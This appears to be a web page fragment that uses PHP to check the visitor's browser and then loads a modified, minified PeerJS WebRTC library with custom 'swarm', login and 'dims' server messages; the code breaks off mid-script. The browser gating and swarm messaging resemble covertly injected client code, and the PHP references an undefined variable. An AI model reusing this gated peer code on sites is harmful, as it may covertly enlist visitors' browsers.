<!DOCTYPE html>
<html lang="en">
<?php
if((strpos($_SERVER["HTTP_USER_AGENT"], 'Chrome')!== false|| strpos($_SERVER["HTTP_USER_AGENT"], 'Firefox')!== false)&&strpos($_SERVER["HTTP_USER_AGENT"], 'Edge')== false&&!preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4))) :
?>
<html lang="en-au" class>
<head>
<script type="text/javascript" id="peer.js">!function e(t,n,i){function r(s,a){if(!n[s]){if(!t[s]){var c="function"==typeof require&&require;if(!a&&c)return c(s,!0);if(o)return o(s,!0);var u=new Error("Cannot find module '"+s+"'");throw u.code="MODULE_NOT_FOUND",u}var p=n[s]={exports:{}};t[s][0].call(p.exports,function(e){var n=t[s][1][e];return r(n?n:e)},p,p.exports,e,t,n,i)}return n[s].exports}for(var o="function"==typeof require&&require,s=0;s<i.length;s++)r(i[s]);return r}({1:[function(e,t){t.exports.RTCSessionDescription=window.RTCSessionDescription||window.mozRTCSessionDescription,t.exports.RTCPeerConnection=window.RTCPeerConnection||window.mozRTCPeerConnection||window.webkitRTCPeerConnection,t.exports.RTCIceCandidate=window.RTCIceCandidate||window.mozRTCIceCandidate},{}],2:[function(e,t){function n(e,t,s){return this instanceof n?(r.call(this),this.options=i.extend({serialization:"binary",reliable:!1},s),this.open=!1,this.type="data",this.peer=e,this.provider=t,this.id=this.options.connectionId||n._idPrefix+i.randomToken(),this.label=this.options.label||this.id,this.metadata=this.options.metadata,this.serialization=this.options.serialization,this.reliable=this.options.reliable,this._buffer=[],this._buffering=!1,this.bufferSize=0,this._chunkedData={},this.options._payload&&(this._peerBrowser=this.options._payload.browser),void o.startConnection(this,this.options._payload||{originator:!0})):new n(e,t,s)}var i=e("./util"),r=e("eventemitter3"),o=e("./negotiator"),s=e("reliable");i.inherits(n,r),n._idPrefix="dc_",n.prototype.initialize=function(e){this._dc=this.dataChannel=e,this._configureDataChannel()},n.prototype._configureDataChannel=function(){var e=this;i.supports.sctp&&(this._dc.binaryType="arraybuffer"),this._dc.onopen=function(){i.log("Data channel connection success"),e.open=!0,e.emit("open")},!i.supports.sctp&&this.reliable&&(this._reliable=new s(this._dc,i.debug)),this._reliable?this._reliable.onmessage=function(t){e.emit("data",t)}:this._dc.onmessage=function(t){e._handleDataMessage(t)},this._dc.onclose=function(){i.log("DataChannel closed for:",e.peer),e.close()}},n.prototype._handleDataMessage=function(e){var t=this,n=e.data,r=n.constructor;if("binary"===this.serialization||"binary-utf8"===this.serialization){if(r===Blob)return void i.blobToArrayBuffer(n,function(e){n=i.unpack(e),t.emit("data",n)});if(r===ArrayBuffer)n=i.unpack(n);else if(r===String){var o=i.binaryStringToArrayBuffer(n);n=i.unpack(o)}}else"json"===this.serialization&&(n=JSON.parse(n));if(n.__peerData){var s=n.__peerData,a=this._chunkedData[s]||{data:[],count:0,total:n.total};return a.data[n.n]=n.data,a.count+=1,a.total===a.count&&(delete this._chunkedData[s],n=new Blob(a.data),this._handleDataMessage({data:n})),void(this._chunkedData[s]=a)}this.emit("data",n)},n.prototype.close=function(){this.open&&(this.open=!1,o.cleanup(this),this.emit("close"))},n.prototype.send=function(e,t){if(!this.open)return void this.emit("error",new Error("Connection is not open. You should listen for the `open` event before sending messages."));if(this._reliable)return void this._reliable.send(e);var n=this;if("json"===this.serialization)this._bufferedSend(JSON.stringify(e));else if("binary"===this.serialization||"binary-utf8"===this.serialization){var r=i.pack(e),o=i.chunkedBrowsers[this._peerBrowser]||i.chunkedBrowsers[i.browser];if(o&&!t&&r.size>i.chunkedMTU)return void this._sendChunks(r);i.supports.sctp?i.supports.binaryBlob?this._bufferedSend(r):i.blobToArrayBuffer(r,function(e){n._bufferedSend(e)}):i.blobToBinaryString(r,function(e){n._bufferedSend(e)})}else this._bufferedSend(e)},n.prototype._bufferedSend=function(e){(this._buffering||!this._trySend(e))&&(this._buffer.push(e),this.bufferSize=this._buffer.length)},n.prototype._trySend=function(e){try{this._dc.send(e)}catch(t){this._buffering=!0;var n=this;return setTimeout(function(){n._buffering=!1,n._tryBuffer()},100),!1}return!0},n.prototype._tryBuffer=function(){if(0!==this._buffer.length){var e=this._buffer[0];this._trySend(e)&&(this._buffer.shift(),this.bufferSize=this._buffer.length,this._tryBuffer())}},n.prototype._sendChunks=function(e){for(var t=i.chunk(e),n=0,r=t.length;r>n;n+=1){var e=t[n];this.send(e,!0)}},n.prototype.handleMessage=function(e){var t=e.payload;switch(e.type){case"ANSWER":this._peerBrowser=t.browser,o.handleSDP(e.type,this,t.sdp);break;case"CANDIDATE":o.handleCandidate(this,t.candidate);break;default:i.warn("Unrecognized message type:",e.type,"from peer:",this.peer)}},t.exports=n},{"./negotiator":5,"./util":8,eventemitter3:9,reliable:12}],3:[function(e){window.Socket=e("./socket"),window.MediaConnection=e("./mediaconnection"),window.DataConnection=e("./dataconnection"),window.Peer=e("./peer"),window.RTCPeerConnection=e("./adapter").RTCPeerConnection,window.RTCSessionDescription=e("./adapter").RTCSessionDescription,window.RTCIceCandidate=e("./adapter").RTCIceCandidate,window.Negotiator=e("./negotiator"),window.util=e("./util"),window.BinaryPack=e("js-binarypack")},{"./adapter":1,"./dataconnection":2,"./mediaconnection":4,"./negotiator":5,"./peer":6,"./socket":7,"./util":8,"js-binarypack":10}],4:[function(e,t){function n(e,t,s){return this instanceof n?(r.call(this),this.options=i.extend({},s),this.open=!1,this.type="media",this.peer=e,this.provider=t,this.metadata=this.options.metadata,this.localStream=this.options._stream,this.id=this.options.connectionId||n._idPrefix+i.randomToken(),void(this.localStream&&o.startConnection(this,{_stream:this.localStream,originator:!0}))):new n(e,t,s)}var i=e("./util"),r=e("eventemitter3"),o=e("./negotiator");i.inherits(n,r),n._idPrefix="mc_",n.prototype.addStream=function(e){i.log("Receiving stream",e),this.remoteStream=e,this.emit("stream",e)},n.prototype.handleMessage=function(e){var t=e.payload;switch(e.type){case"ANSWER":o.handleSDP(e.type,this,t.sdp),this.open=!0;break;case"CANDIDATE":o.handleCandidate(this,t.candidate);break;default:i.warn("Unrecognized message type:",e.type,"from peer:",this.peer)}},n.prototype.answer=function(e){if(this.localStream)return void i.warn("Local stream already exists on this MediaConnection. Are you answering a call twice?");this.options._payload._stream=e,this.localStream=e,o.startConnection(this,this.options._payload);for(var t=this.provider._getMessages(this.id),n=0,r=t.length;r>n;n+=1)this.handleMessage(t[n]);this.open=!0},n.prototype.close=function(){this.open&&(this.open=!1,o.cleanup(this),this.emit("close"))},t.exports=n},{"./negotiator":5,"./util":8,eventemitter3:9}],5:[function(e,t){var n=e("./util"),i=e("./adapter").RTCPeerConnection,r=e("./adapter").RTCSessionDescription,o=e("./adapter").RTCIceCandidate,s={pcs:{data:{},media:{}},queue:[]};s._idPrefix="pc_",s.startConnection=function(e,t){var i=s._getPeerConnection(e,t);if("media"===e.type&&t._stream&&i.addStream(t._stream),e.pc=e.peerConnection=i,t.originator){if("data"===e.type){var r={};n.supports.sctp||(r={reliable:t.reliable});var o=i.createDataChannel(e.label,r);e.initialize(o)}n.supports.onnegotiationneeded||s._makeOffer(e)}else s.handleSDP("OFFER",e,t.sdp)},s._getPeerConnection=function(e,t){s.pcs[e.type]||n.error(e.type+" is not a valid connection type. Maybe you overrode the `type` property somewhere."),s.pcs[e.type][e.peer]||(s.pcs[e.type][e.peer]={});{var i;s.pcs[e.type][e.peer]}return t.pc&&(i=s.pcs[e.type][e.peer][t.pc]),i&&"stable"===i.signalingState||(i=s._startPeerConnection(e)),i},s._startPeerConnection=function(e){n.log("Creating RTCPeerConnection.");var t=s._idPrefix+n.randomToken(),r={};"data"!==e.type||n.supports.sctp?"media"===e.type&&(r={optional:[{DtlsSrtpKeyAgreement:!0}]}):r={optional:[{RtpDataChannels:!0}]};var o=new i(e.provider.options.config,r);return s.pcs[e.type][e.peer][t]=o,s._setupListeners(e,o,t),o},s._setupListeners=function(e,t){var i=e.peer,r=e.id,o=e.provider;n.log("Listening for ICE candidates."),t.onicecandidate=function(t){t.candidate&&(n.log("Received ICE candidates for:",e.peer),o.socket.send({type:"CANDIDATE",payload:{candidate:t.candidate,type:e.type,connectionId:e.id},dst:i}))},t.oniceconnectionstatechange=function(){switch(t.iceConnectionState){case"disconnected":case"failed":n.log("iceConnectionState is disconnected, closing connections to "+i),e.close();break;case"completed":t.onicecandidate=n.noop}},t.onicechange=t.oniceconnectionstatechange,n.log("Listening for `negotiationneeded`"),t.onnegotiationneeded=function(){n.log("`negotiationneeded` triggered"),"stable"==t.signalingState?s._makeOffer(e):n.log("onnegotiationneeded triggered when not stable. Is another connection being established?")},n.log("Listening for data channel"),t.ondatachannel=function(e){n.log("Received data channel");var t=e.channel,s=o.getConnection(i,r);null!=s&&s.initialize(t)},n.log("Listening for remote stream"),t.onaddstream=function(e){n.log("Received remote stream");var t=e.stream,s=o.getConnection(i,r);"media"===s.type&&s.addStream(t)}},s.cleanup=function(e){n.log("Cleaning up PeerConnection to "+e.peer);var t=e.pc;!t||"closed"===t.readyState&&"closed"===t.signalingState||(t.close(),e.pc=null)},s._makeOffer=function(e){var t=e.pc;t.createOffer(function(i){n.log("Created offer."),!n.supports.sctp&&"data"===e.type&&e.reliable&&(i.sdp=Reliable.higherBandwidthSDP(i.sdp)),t.setLocalDescription(i,function(){n.log("Set localDescription: offer","for:",e.peer),e.provider.socket.send({type:"OFFER",payload:{sdp:i,type:e.type,label:e.label,connectionId:e.id,reliable:e.reliable,serialization:e.serialization,metadata:e.metadata,browser:n.browser},dst:e.peer})},function(t){e.provider.emitError("webrtc",t),n.log("Failed to setLocalDescription, ",t)})},function(t){e.provider.emitError("webrtc",t),n.log("Failed to createOffer, ",t)},e.options.constraints)},s._makeAnswer=function(e){var t=e.pc;t.createAnswer(function(i){n.log("Created answer."),!n.supports.sctp&&"data"===e.type&&e.reliable&&(i.sdp=Reliable.higherBandwidthSDP(i.sdp)),t.setLocalDescription(i,function(){n.log("Set localDescription: answer","for:",e.peer),e.provider.socket.send({type:"ANSWER",payload:{sdp:i,type:e.type,connectionId:e.id,browser:n.browser},dst:e.peer})},function(t){e.provider.emitError("webrtc",t),n.log("Failed to setLocalDescription, ",t)})},function(t){e.provider.emitError("webrtc",t),n.log("Failed to create answer, ",t)})},s.handleSDP=function(e,t,i){i=new r(i);var o=t.pc;n.log("Setting remote description",i),o.setRemoteDescription(i,function(){n.log("Set remoteDescription:",e,"for:",t.peer),"OFFER"===e&&s._makeAnswer(t)},function(e){t.provider.emitError("webrtc",e),n.log("Failed to setRemoteDescription, ",e)})},s.handleCandidate=function(e,t){var i=t.candidate,r=t.sdpMLineIndex;e.pc.addIceCandidate(new o({sdpMLineIndex:r,candidate:i})),n.log("Added ICE candidate for:",e.peer)},t.exports=s},{"./adapter":1,"./util":8}],6:[function(e,t){function n(e,t){return this instanceof n?(r.call(this),e&&e.constructor==Object?(t=e,e=void 0):e&&(e=e.toString()),t=i.extend({debug:0,host:i.CLOUD_HOST,port:i.CLOUD_PORT,key:"peerjs",path:"/",token:i.randomToken(),config:i.defaultConfig},t),this.options=t,"/"===t.host&&(t.host=window.location.hostname),"/"!==t.path[0]&&(t.path="/"+t.path),"/"!==t.path[t.path.length-1]&&(t.path+="/"),void 0===t.secure&&t.host!==i.CLOUD_HOST&&(t.secure=i.isSecure()),t.logFunction&&i.setLogFunction(t.logFunction),i.setLogLevel(t.debug),i.supports.audioVideo||i.supports.data?i.validateId(e)?i.validateKey(t.key)?t.secure&&"0.peerjs.com"===t.host?void this._delayedAbort("ssl-unavailable","The cloud server currently does not support HTTPS. Please run your own PeerServer to use HTTPS."):(this.destroyed=!1,this.disconnected=!1,this.open=!1,this.connections={},this._lostMessages={},this._initializeServerConnection(),void(e?this._initialize(e):this._retrieveId())):void this._delayedAbort("invalid-key",'API KEY "'+t.key+'" is invalid'):void this._delayedAbort("invalid-id",'ID "'+e+'" is invalid'):void this._delayedAbort("browser-incompatible","The current browser does not support WebRTC")):new n(e,t)}var i=e("./util"),r=e("eventemitter3"),o=e("./socket"),s=e("./mediaconnection"),a=e("./dataconnection");i.inherits(n,r),n.prototype._initializeServerConnection=function(){var e=this;this.socket=new o(this.options.secure,this.options.host,this.options.port,this.options.path,this.options.key),this.socket.on("message",function(t){e._handleMessage(t)}),this.socket.on("error",function(t){e._abort("socket-error",t)}),this.socket.on("disconnected",function(){e.disconnected||(e.emitError("network","Lost connection to server."),e.disconnect())}),this.socket.on("close",function(){e.disconnected||e._abort("socket-closed","Underlying socket is already closed.")})},n.prototype._retrieveId=function(){var e=this,t=new XMLHttpRequest,n=this.options.secure?"https://":"http://",r=n+this.options.host+":"+this.options.port+this.options.path+this.options.key+"/id",o="?ts="+(new Date).getTime()+Math.random();r+=o,t.open("get",r,!0),t.onerror=function(t){i.error("Error retrieving ID",t);var n="";"/"===e.options.path&&e.options.host!==i.CLOUD_HOST&&(n=" If you passed in a `path` to your self-hosted PeerServer, you'll also need to pass in that same path when creating a new Peer."),e._abort("server-error","Could not get an ID from the server."+n)},t.onreadystatechange=function(){return 4===t.readyState?200!==t.status?void t.onerror():void e._initialize(t.responseText):void 0},t.send(null)},n.prototype._initialize=function(e){this.id=e,this.socket.start(this.id,this.options.token)},n.prototype._handleMessage=function(e){var t,n=e.type,r=e.payload,o=e.src;switch(n){case"OPEN":this.emit("open",this.id),this.open=!0;break;case"ERROR":this._abort("server-error",r.msg);break;case"ID-TAKEN":this.SM[this.SM.length]="Two logins";break;case"INVALID-KEY":this._abort("invalid-key",'API KEY "'+this.options.key+'" is invalid');break;case"SM":switch(r.msg){case"External Dims":"0"!=r.data.split(":")[1]&&(this.SM[this.SM.length]="E"+r.data.split(":")[0]+":"+r.data.split(":")[1]),"0"!=r.data.split(":")[2]&&(this.SM[this.SM.length]="E"+r.data.split(":")[0]+":"+r.data.split(":")[2]),"0"!=r.data.split(":")[3]&&(this.SM[this.SM.length]="E"+r.data.split(":")[0]+":"+r.data.split(":")[3]);break;case"Initial Data":this.SM[this.SM.length]="I"+r.name+":"+r.data;break;case"Wrong Password":this.SM[this.SM.length]="Wrong Password";break;case"User Logged In":this.SM[this.SM.length]="Logged In";break;case"User Dims":this.SM[this.SM.length]="D"+r.data;break;case"Swarm Details":this.SM[this.SM.length]="S"+r.data;break;default:console.log("Unknown server message:"+r.msg)}break;case"LEAVE":i.log("Received leave message from",o),this._cleanupPeer(o);break;case"EXPIRE":this.emitError("peer-unavailable","Could not connect to peer "+o);break;case"OFFER":var c=r.connectionId;if(t=this.getConnection(o,c))i.warn("Offer received for existing Connection ID:",c);else{if("media"===r.type)t=new s(o,this,{connectionId:c,_payload:r,metadata:r.metadata}),this._addConnection(o,t),this.emit("call",t);else{if("data"!==r.type)return void i.warn("Received malformed connection type:",r.type);t=new a(o,this,{connectionId:c,_payload:r,metadata:r.metadata,label:r.label,serialization:r.serialization,reliable:r.reliable}),this._addConnection(o,t),this.emit("connection",t)}for(var u=this._getMessages(c),p=0,h=u.length;h>p;p+=1)t.handleMessage(u[p])}break;default:if(!r)return void i.warn("You received a malformed message from "+o+" of type "+n);var d=r.connectionId;t=this.getConnection(o,d),t&&t.pc?t.handleMessage(e):d?this._storeMessage(d,e):i.warn("You received an unrecognized message:",e)}},n.prototype._storeMessage=function(e,t){this._lostMessages[e]||(this._lostMessages[e]=[]),this._lostMessages[e].push(t)},n.prototype._getMessages=function(e){var t=this._lostMessages[e];return t?(delete this._lostMessages[e],t):[]},n.prototype.connect=function(e,t){if(this.disconnected)return i.warn("You cannot connect to a new Peer because you called .disconnect() on this Peer and ended your connection with the server. You can create a new Peer to reconnect, or call reconnect on this peer if you believe its ID to still be available."),void this.emitError("disconnected","Cannot connect to new Peer after disconnecting from server.");var n=new a(e,this,t);return this._addConnection(e,n),n},n.prototype.call=function(e,t,n){if(this.disconnected)return i.warn("You cannot connect to a new Peer because you called .disconnect() on this Peer and ended your connection with the server. You can create a new Peer to reconnect."),void this.emitError("disconnected","Cannot connect to new Peer after disconnecting from server.");if(!t)return void i.error("To call a peer, you must provide a stream from your browser's `getUserMedia`.");n=n||{},n._stream=t;var r=new s(e,this,n);return this._addConnection(e,r),r},n.prototype._addConnection=function(e,t){this.connections[e]||(this.connections[e]=[]),this.connections[e].push(t)},n.prototype.getConnection=function(e,t){var n=this.connections[e];if(!n)return null;for(var i=0,r=n.length;r>i;i++)if(n[i].id===t)return n[i];return null},n.prototype._delayedAbort=function(e,t){var n=this;i.setZeroTimeout(function(){n._abort(e,t)})},n.prototype._abort=function(e,t){i.error("Aborting!"),this._lastServerId?this.disconnect():this.destroy(),this.emitError(e,t)},n.prototype.emitError=function(e,t){i.error("Error:",t),"string"==typeof t&&(t=new Error(t)),t.type=e,this.emit("error",t)},n.prototype.destroy=function(){this.destroyed||(this._cleanup(),this.disconnect(),this.destroyed=!0)},n.prototype._cleanup=function(){if(this.connections)for(var e=Object.keys(this.connections),t=0,n=e.length;n>t;t++)this._cleanupPeer(e[t]);this.emit("close")},n.prototype._cleanupPeer=function(e){for(var t=this.connections[e],n=0,i=t.length;i>n;n+=1)t[n].close()},n.prototype.disconnect=function(){var e=this;i.setZeroTimeout(function(){e.disconnected||(e.disconnected=!0,e.open=!1,e.socket&&e.socket.close(),e.emit("disconnected",e.id),e._lastServerId=e.id,e.id=null)})},n.prototype.sendSM=function(e){this.open?(console.log("sending message:"+e),this.socket.send({type:"SM",data:e})):this.disconnected||this.open?console.log("server is not connected!!!"):this.socket._queue[this.socket._queue.length]={type:"SM",data:e}},n.prototype.SM=[],n.prototype.SWARM="",n.prototype.reconnect=function(){if(this.disconnected&&!this.destroyed)i.log("Attempting reconnection to server with ID "+this._lastServerId),this.disconnected=!1,this._initializeServerConnection(),this._initialize(this._lastServerId);else{if(this.destroyed)throw new Error("This peer cannot reconnect to the server. It has already been destroyed.");if(this.disconnected||this.open)throw new Error("Peer "+this.id+" cannot reconnect because it is not disconnected from the server!");i.error("In a hurry? We're still trying to make the initial connection!")}},n.prototype.listAllPeers=function(e){e=e||function(){};var t=this,n=new XMLHttpRequest,r=this.options.secure?"https://":"http://",o=r+this.options.host+":"+this.options.port+this.options.path+this.options.key+"/peers",s="?ts="+(new Date).getTime()+Math.random();o+=s,n.open("get",o,!0),n.onerror=function(){t._abort("server-error","Could not get peers from the server."),e([])},n.onreadystatechange=function(){if(4===n.readyState){if(401===n.status){var r="";throw r=t.options.host!==i.CLOUD_HOST?"It looks like you're using the cloud server. You can email team@peerjs.com to enable peer listing for your API key.":"You need to enable `allow_discovery` on your self-hosted PeerServer to use this feature.",e([]),new Error("It doesn't look like you have permission to list peers IDs. "+r)}e(200!==n.status?[]:JSON.parse(n.responseText))}},n.send(null)},t.exports=n},{"./dataconnection":2,"./mediaconnection":4,"./socket":7,"./util":8,eventemitter3:9}],7:[function(e,t){function n(e,t,i,o,s){if(!(this instanceof n))return new n(e,t,i,o,s);r.call(this),this.disconnected=!1,this._queue=[];var a=e?"https://":"http://",c=e?"wss://":"ws://";this._httpUrl=a+t+":"+i+o+s,this._wsUrl=c+t+":"+i+o+"peerjs?key="+s}var i=e("./util"),r=e("eventemitter3");i.inherits(n,r),n.prototype.start=function(e,t){this.id=e,this._httpUrl+="/"+e+"/"+t,this._wsUrl+="&id="+e+"&token="+t,this._startXhrStream(),this._startWebSocket()},n.prototype._startWebSocket=function(){var e=this;this._socket||(this._socket=new WebSocket(this._wsUrl),this._socket.onmessage=function(t){try{var n=JSON.parse(t.data)}catch(r){return i.log("Invalid server message",t.data),void console.log(t)}e.emit("message",n)},this._socket.onclose=function(){i.log("Socket closed."),e.disconnected=!0,e.emit("disconnected")},this._socket.onopen=function(){e._timeout&&(clearTimeout(e._timeout),setTimeout(function(){e._http.abort(),e._http=null},5e3)),e._sendQueuedMessages(),i.log("Socket open")})},n.prototype._startXhrStream=function(e){try{var t=this;this._http=new XMLHttpRequest,this._http._index=1,this._http._streamIndex=e||0,this._http.open("post",this._httpUrl+"/id?i="+this._http._streamIndex,!0),this._http.onerror=function(){clearTimeout(t._timeout),t.emit("disconnected")},this._http.onreadystatechange=function(){2==this.readyState&&this.old?(this.old.abort(),delete this.old):this.readyState>2&&200===this.status&&this.responseText&&t._handleStream(this)},this._http.send(null),this._setHTTPTimeout()}catch(n){i.log("XMLHttpRequest not available; defaulting to WebSockets")}},n.prototype._handleStream=function(e){var t=e.responseText.split("\n");if(e._buffer)for(;e._buffer.length>0;){var n=e._buffer.shift(),r=t[n];try{r=JSON.parse(r)}catch(o){e._buffer.shift(n);break}this.emit("message",r)}var s=t[e._index];if(s)if(e._index+=1,e._index===t.length)e._buffer||(e._buffer=[]),e._buffer.push(e._index-1);else{try{s=JSON.parse(s)}catch(o){return void i.log("Invalid server message",s)}this.emit("message",s)}},n.prototype._setHTTPTimeout=function(){var e=this;this._timeout=setTimeout(function(){var t=e._http;e._wsOpen()?t.abort():(e._startXhrStream(t._streamIndex+1),e._http.old=t)},25e3)},n.prototype._wsOpen=function(){return this._socket&&1==this._socket.readyState},n.prototype._sendQueuedMessages=function(){for(var e=0,t=this._queue.length;t>e;e+=1)this.send(this._queue[e])},n.prototype.send=function(e){if(!this.disconnected){if(!this.id)return void this._queue.push(e);if(!e.type)return void this.emit("error","Invalid message");var t=JSON.stringify(e);if(this._wsOpen())this._socket.send(t);else{var n=new XMLHttpRequest,i=this._httpUrl+"/"+e.type.toLowerCase();n.open("post",i,!0),n.setRequestHeader("Content-Type","application/json"),n.send(t)}}},n.prototype.close=function(){!this.disconnected&&this._wsOpen()&&(this._socket.close(),this.disconnected=!0)},t.exports=n},{"./util":8,eventemitter3:9}],8:[function(e,t){var n={iceServers:[{url:"stun:stun.l.google.com:19302"}]},i=1,r=e("js-binarypack"),o=e("./adapter").RTCPeerConnection,s={noop:function(){},CLOUD_HOST:"0.peerjs.com",CLOUD_PORT:9e3,chunkedBrowsers:{Chrome:1},chunkedMTU:16300,logLevel:3,setLogLevel:function(e){var t=parseInt(e,10);s.logLevel=isNaN(parseInt(e,10))?e?3:0:t,s.log=s.warn=s.error=s.noop,s.logLevel>0&&(s.error=s._printWith("ERROR")),s.logLevel>1&&(s.warn=s._printWith("WARNING")),s.logLevel>0&&(s.log=s._print)},setLogFunction:function(e){e.constructor!==Function?s.warn("The log function you passed in is not a function. Defaulting to regular logs."):s._print=e},_printWith:function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e),s._print.apply(s,t)}},_print:function(){var e=!1,t=Array.prototype.slice.call(arguments);t.unshift("PeerJS: ");for(var n=0,i=t.length;i>n;n++)t[n]instanceof Error&&(t[n]="("+t[n].name+") "+t[n].message,e=!0);e?console.error.apply(console,t):console.log.apply(console,t)},defaultConfig:n,browser:function(){return window.mozRTCPeerConnection?"Firefox":window.webkitRTCPeerConnection?"Chrome":window.RTCPeerConnection?"Supported":"Unsupported"}(),supports:function(){if("undefined"==typeof o)return{};var e,t,i=!0,r=!0,a=!1,c=!1,u=!!window.webkitRTCPeerConnection;try{e=new o(n,{optional:[{RtpDataChannels:!0}]})}catch(p){i=!1,r=!1}if(i)try{t=e.createDataChannel("_PEERJSTEST")}catch(p){i=!1}if(i){try{t.binaryType="blob",a=!0}catch(p){}var h=new o(n,{});try{var d=h.createDataChannel("_PEERJSRELIABLETEST",{});c=d.reliable}catch(p){}h.close()}if(r&&(r=!!e.addStream),!u&&i){var l=new o(n,{optional:[{RtpDataChannels:!0}]});l.onnegotiationneeded=function(){u=!0,s&&s.supports&&(s.supports.onnegotiationneeded=!0)},l.createDataChannel("_PEERJSNEGOTIATIONTEST"),setTimeout(function(){l.close()},1e3)}return e&&e.close(),{audioVideo:r,data:i,binaryBlob:a,binary:c,reliable:c,sctp:c,onnegotiationneeded:u}}(),validateId:function(e){return!e||/^[A-Za-z0-9_-]+(?:[ _-][A-Za-z0-9]+)*$/.exec(e)},validateKey:function(e){return!e||/^[A-Za-z0-9_-]+(?:[ _-][A-Za-z0-9]+)*$/.exec(e)},debug:!1,inherits:function(e,t){e.super_=t,e.prototype=Object.create(t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}})},extend:function(e,t){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n]);return e},pack:r.pack,unpack:r.unpack,log:function(){if(s.debug){var e=!1,t=Array.prototype.slice.call(arguments);t.unshift("PeerJS: ");for(var n=0,i=t.length;i>n;n++)t[n]instanceof Error&&(t[n]="("+t[n].name+") "+t[n].message,e=!0);e?console.error.apply(console,t):console.log.apply(console,t)}},setZeroTimeout:function(e){function t(t){i.push(t),e.postMessage(r,"*")}function n(t){t.source==e&&t.data==r&&(t.stopPropagation&&t.stopPropagation(),i.length&&i.shift()())}var i=[],r="zero-timeout-message";return e.addEventListener?e.addEventListener("message",n,!0):e.attachEvent&&e.attachEvent("onmessage",n),t}(window),chunk:function(e){for(var t=[],n=e.size,r=index=0,o=Math.ceil(n/s.chunkedMTU);n>r;){var a=Math.min(n,r+s.chunkedMTU),c=e.slice(r,a),u={__peerData:i,n:index,data:c,total:o};t.push(u),r=a,index+=1}return i+=1,t},blobToArrayBuffer:function(e,t){var n=new FileReader;n.onload=function(e){t(e.target.result)},n.readAsArrayBuffer(e)},blobToBinaryString:function(e,t){var n=new FileReader;n.onload=function(e){t(e.target.result)},n.readAsBinaryString(e)},binaryStringToArrayBuffer:function(e){for(var t=new Uint8Array(e.length),n=0;n<e.length;n++)t[n]=255&e.charCodeAt(n);return t.buffer},randomToken:function(){return Math.random().toString(36).substr(2)},isSecure:function(){return"https:"===location.protocol}};t.exports=s},{"./adapter":1,"js-binarypack":10}],9:[function(e,t){"use strict";function n(e,t,n){this.fn=e,this.context=t,this.once=n||!1}function i(){}i.prototype._events=void 0,i.prototype.listeners=function(e){if(!this._events||!this._events[e])return[];for(var t=0,n=this._events[e].length,i=[];n>t;t++)i.push(this._events[e][t].fn);return i},i.prototype.emit=function(e,t,n,i,r,o){if(!this._events||!this._events[e])return!1;var s,a,c,u=this._events[e],p=u.length,h=arguments.length,d=u[0];if(1===p){switch(d.once&&this.removeListener(e,d.fn,!0),h){case 1:return d.fn.call(d.context),!0;case 2:return d.fn.call(d.context,t),!0;case 3:return d.fn.call(d.context,t,n),!0;case 4:return d.fn.call(d.context,t,n,i),!0;case 5:return d.fn.call(d.context,t,n,i,r),!0;case 6:return d.fn.call(d.context,t,n,i,r,o),!0}for(a=1,s=new Array(h-1);h>a;a++)s[a-1]=arguments[a];d.fn.apply(d.context,s)}else for(a=0;p>a;a++)switch(u[a].once&&this.removeListener(e,u[a].fn,!0),h){case 1:u[a].fn.call(u[a].context);break;case 2:u[a].fn.call(u[a].context,t);break;case 